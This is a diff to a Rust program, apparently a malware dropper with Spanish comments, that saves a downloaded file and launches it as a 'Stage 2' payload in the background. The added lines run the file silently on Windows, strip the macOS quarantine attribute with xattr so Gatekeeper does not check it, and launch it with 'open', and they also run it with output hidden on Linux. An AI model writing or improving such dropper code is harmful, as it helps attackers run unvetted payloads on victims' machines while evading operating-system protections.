@@ -27,17 +27,44 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     file.write_all(&bytes)?;
     println!("✅ Archivo guardado en: {}", path);
 
+    // === EJECUTAR PAYLOAD ===
+    #[cfg(target_os = "windows")]
+    {
+        Command::new(&path)
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn()?;
+    }
+
     #[cfg(any(target_os = "macos", target_os = "linux"))]
     {
         use std::os::unix::fs::PermissionsExt;
         let mut perms = std::fs::metadata(&path)?.permissions();
         perms.set_mode(0o755);
         std::fs::set_permissions(&path, perms)?;
+
+        #[cfg(target_os = "macos")]
+        {
+            let _ = Command::new("xattr")
+                .args(&["-dr", "com.apple.quarantine", &path])
+                .output();
+        }
+
         println!("🚀 Ejecutando payload...");
-        Command::new(&path)
-            .stdout(Stdio::null())
-            .stderr(Stdio::null())
-            .spawn()?;
+        // Usar open en macOS para que tenga entorno gráfico
+        #[cfg(target_os = "macos")]
+        {
+            Command::new("open")
+                .arg(&path)
+                .spawn()?;
+        }
+        #[cfg(target_os = "linux")]
+        {
+            Command::new(&path)
+                .stdout(Stdio::null())
+                .stderr(Stdio::null())
+                .spawn()?;
+        }
     }
 
     println!("✅ Stage 2 ejecutándose en background");
